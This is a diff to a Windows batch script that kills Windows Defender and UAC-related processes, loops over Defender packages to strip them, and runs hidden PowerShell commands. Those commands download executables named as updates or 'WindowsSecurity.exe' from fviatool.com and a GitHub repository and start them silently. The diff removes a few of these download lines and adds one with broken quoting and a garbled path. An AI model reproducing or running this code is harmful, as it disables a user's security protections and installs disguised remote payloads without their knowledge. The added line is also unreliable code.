@@ -15,7 +15,6 @@ taskkill /f /im NisSrv.exe
 taskkill /f /im UserAccountControlSettings.exe
 taskkill /f /im taskkill.exe
 
-
 set "defender_packages=Windows-Defender-Nis-Group-Package Windows-Defender-Management-Powershell-Group-Package Windows-Defender-Management-MDM-Group-Package Windows-Defender-Management-Group-Package Windows-Defender-Group-Policy-Package Windows-Defender-Core-Group-Package Windows-Defender-Client-Package Windows-Defender-ApplicationGuard-Inbox-WOW64-Package Windows-Defender-ApplicationGuard-Inbox-Package Windows-Defender-AppLayer-Group-Package Windows-Defender-AM-Default-Definitions-Package Windows-Defender-AM-Default-Definitions-OptionalWrapper-Package"
 
 for %%i in (%defender_packages%) do (
@@ -40,11 +39,6 @@ powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).Downl
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/WindowsSecurity.exe', 'C:\Users\%USERNAME%\Downloads\WindowsSecurity.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\WindowsSecurity.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/update.exe', 'C:\Users\%USERNAME%\Downloads\update.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/get.exe', 'C:\Users\%USERNAME%\Downloads\get.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\get.exe' -WindowStyle Hidden"
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/update.mp3', 'C:\Users\%USERNAME%\Downloads\update.mp3'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.mp3' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/update.exe', 'C:\Users\%USERNAME%\Downloads\update.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/fvia.exe', 'C:\Users\%USERNAME%\Downloads\fvia.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\fvia.exe' -WindowStyle Hidden"
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/Runtime.exe', 'C:\Users\%USERNAME%\Downloads\Runtime.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\Runtime.exe' -WindowStyle Hidden"
-
-echo Files have been downloaded and executed.
-
-
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/Runtime.exe', 'C:\Users\%USERNAME%\Downloads\Runtime.exe’); Start-Process -FilePath ‘C:\Users%USERNAME%\Downloads\Runtime.exe’ -WindowStyle Hidden”
